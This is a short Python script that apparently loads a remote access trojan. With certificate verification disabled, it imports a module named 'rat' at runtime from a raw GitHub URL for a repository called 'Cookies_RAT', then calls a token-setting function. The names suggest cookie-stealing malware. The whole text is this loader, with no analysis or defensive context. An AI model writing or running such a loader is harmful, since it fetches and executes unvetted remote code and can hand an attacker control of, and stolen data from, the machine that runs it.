import httpimport
httpimport.INSECURE = True
with httpimport.remote_repo(["rat"], "https://raw.githubusercontent.com/Callumgm/Cookies_RAT/Testing-remote-modules/src"): import rat
rat.token_set("")